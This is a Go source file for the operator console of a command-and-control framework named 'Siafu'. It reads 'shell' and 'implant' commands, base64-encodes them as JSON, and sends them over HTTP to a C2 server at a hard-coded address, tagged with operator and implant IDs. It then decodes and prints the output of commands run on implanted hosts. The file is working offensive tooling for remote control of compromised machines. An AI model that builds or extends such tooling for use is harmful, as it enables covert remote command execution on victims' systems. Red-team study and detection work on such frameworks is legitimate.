
package main

import (
    "bufio"
    "fmt"
    "net/http"
    "os"
    "strings"
    "bytes"
    "encoding/base64"
    "encoding/json"
    "io/ioutil"
    "time"

)

const (
    serverURL = "http://192.168.0.54:8443" // Replace this with your server URL
    operatorID = "123abc"
)

type Command struct {
    Group    string `json:"Group"`
    String   string `json:"String"`
    Response string `json:"Response"`
}

var implant_cmd bool
var server_cmd bool
var implantID string
var ID_Set bool


func main() {
    orange := "\033[33m"
    red := "\033[31m"
    reset := "\033[0m"
    for {
        reader := bufio.NewReader(os.Stdin)
        fmt.Print(orange)
        if implantID != "" {
            fmt.Printf("Siafu [Implant: %s] >> ", implantID)
        } else {
            fmt.Print("Siafu >> ")
        }
        fmt.Print(reset) 
        input, err := reader.ReadString('\n')
        if err != nil {
            fmt.Print(red)
            fmt.Println("Error reading input:", err)
            fmt.Print(reset)
            continue
        }

        // Trim spaces and newline characters from the input
        input = strings.TrimSpace(input)

        // Parse the input command
        parts := strings.Fields(input)
        if len(parts) < 2 {
            fmt.Print(red)
            fmt.Println("Invalid command. Please provide a command group and a command.")
            fmt.Print(reset)
            
            continue
        }

        cmdGroup := parts[0]
        switch cmdGroup {
        case "shell":
            implant_cmd = true
        case "implant":
            ID_Set = false
            for _, part := range parts {
                if strings.HasPrefix(part, "-s") {
                    subPart := strings.Split(parts[2], " ")
                    implantID = subPart[0]
                    fmt.Println(implantID)

                    if implantID != "" {
                        server_cmd = false
                        ID_Set = true
                        break
                    }

                }
            }
            if !ID_Set {
                server_cmd = true
            }
            
        default:
            fmt.Print(red)
            fmt.Println("Invalid command group. Valid command groups are 'shell' and 'implant'.")
            fmt.Print(reset)
            
            continue
        }
        cmdString := strings.Join(parts[1:], " ")

        if implant_cmd {
            
            err = sendCommand(cmdGroup, cmdString)
            if err != nil {
                fmt.Print(red)
                fmt.Println("Error sending command:", err)
                fmt.Print(reset)
                
                continue
            }
        }
        
        if server_cmd {
            err = servercommand(cmdGroup, cmdString)
            if err != nil {
                fmt.Print(red)
                fmt.Println("Error sending command:", err)
                fmt.Print(reset)
                
                continue
            }
        }
    }
}

func sendCommand(cmdGroup, cmdString string) error {
    endpoint := "/operator"
    server := serverURL + endpoint
    fmt.Println(server)
    client := &http.Client{}

    commandURL := server
    
    cmdData := Command{
        Group:   cmdGroup,
        String:  cmdString,
        Response: "", 
    }

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        // Send request to server
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        
    // Serialize command data to JSON
    jsonData, err := json.Marshal(cmdData)
    if err != nil {
        return fmt.Errorf("error marshaling JSON data: %w", err)
    }

    // Base64 encode the JSON data
    base64Data := base64.StdEncoding.EncodeToString(jsonData)

    // Create HTTP request
    req, err := http.NewRequest("POST", commandURL, bytes.NewBuffer([]byte(base64Data)))
    if err != nil {
        return fmt.Errorf("error creating HTTP request: %w", err)
    }
    req.Header.Set("Content-Type", "text/plain") // Set content type to text/plain
    req.Header.Set("Operator-ID", operatorID)
    req.Header.Set("Implant-ID", implantID)

    // Send request
    resp, err := client.Do(req)
    if err != nil {
        return err
    }

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        // Receive response from server
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        
    var responseBytes []byte
    var responseBody string
    var decodedData []byte
    for {
        // Read the response
        responseBytes, err = ioutil.ReadAll(resp.Body)
        if err != nil {
            return fmt.Errorf("error reading response body: %w", err)
        }
        responseBody = string(responseBytes) // Convert []byte to string
    // Extract and decode data value
        dataIndex := strings.Index(responseBody, "Data:")
        if dataIndex != -1 {
            data := strings.TrimSpace(responseBody[dataIndex+len("Data:"):])
            decodedData, err = base64.StdEncoding.DecodeString(data)
            if err != nil {
                return fmt.Errorf("error decoding base64 data: %w", err)
            }
        } else {
            fmt.Println("Data not found in response")
        }
        if len(responseBody) > 0 {
            break
        }
        time.Sleep(100 * time.Millisecond) // Wait for a short duration before trying again
    }
    
    // Unmarshal JSON
   var respstruct Command

   // Trim leading and trailing whitespace
   decodedData = bytes.TrimSpace(decodedData)
   
   err = json.Unmarshal(decodedData, &respstruct)
   if err != nil {
       return fmt.Errorf("Failed to unmarshal JSON: %s", err)
   }
   
    fmt.Println("CmdResponse:", respstruct.Response)
    defer resp.Body.Close()
    return nil
}


func servercommand(cmdGroup, cmdString string) error {
    endpoint := "/info"
    server := serverURL + endpoint
    fmt.Println(server)
    client := &http.Client{}

    commandURL := server
    
    cmdData := Command{
        Group:   cmdGroup,
        String:  cmdString,
        Response: "", 
    }

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        // Send request to server
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        
    // Serialize command data to JSON
    jsonData, err := json.Marshal(cmdData)
    if err != nil {
        return fmt.Errorf("error marshaling JSON data: %w", err)
    }

    // Base64 encode the JSON data
    base64Data := base64.StdEncoding.EncodeToString(jsonData)

    // Create HTTP request
    req, err := http.NewRequest("GET", commandURL, bytes.NewBuffer([]byte(base64Data)))
    if err != nil {
        return fmt.Errorf("error creating HTTP request: %w", err)
    }
    req.Header.Set("Content-Type", "text/plain") // Set content type to text/plain
    req.Header.Set("Operator-ID", operatorID)

    // Send request
    resp, err := client.Do(req)
    if err != nil {
        return err
    }

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        // Receive response from server
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        
    var responseBytes []byte
    var responseBody string
    var decodedData []byte
    for {
        // Read the response
        responseBytes, err = ioutil.ReadAll(resp.Body)
        if err != nil {
            return fmt.Errorf("error reading response body: %w", err)
        }
        responseBody = string(responseBytes) // Convert []byte to string
    // Extract and decode data value
        dataIndex := strings.Index(responseBody, "Data:")
        if dataIndex != -1 {
            data := strings.TrimSpace(responseBody[dataIndex+len("Data:"):])
            decodedData, err = base64.StdEncoding.DecodeString(data)
            if err != nil {
                return fmt.Errorf("error decoding base64 data: %w", err)
            }
        } else {
            fmt.Println("Data not found in response")
        }
        if len(responseBody) > 0 {
            break
        }
        time.Sleep(100 * time.Millisecond) // Wait for a short duration before trying again
    }
    
    // Unmarshal JSON
   var respstruct Command

   // Trim leading and trailing whitespace
   decodedData = bytes.TrimSpace(decodedData)
   
   err = json.Unmarshal(decodedData, &respstruct)
   if err != nil {
       return fmt.Errorf("Failed to unmarshal JSON: %s", err)
   }
   
    fmt.Println("CmdResponse:\n", respstruct.Response)
    defer resp.Body.Close()
    return nil
}


// Helper functions to convert uint32 to bytes and vice versa
func uint32ToBytes(n uint32) []byte {
    b := make([]byte, 4)
    b[0] = byte(n >> 24)
    b[1] = byte(n >> 16)
    b[2] = byte(n >> 8)
    b[3] = byte(n)
    return b
}

func bytesToUint32(b []byte) uint32 {
    return uint32(b[0])<<24 | uint32(b[1])<<16 | uint32(b[2])<<8 | uint32(b[3])
}
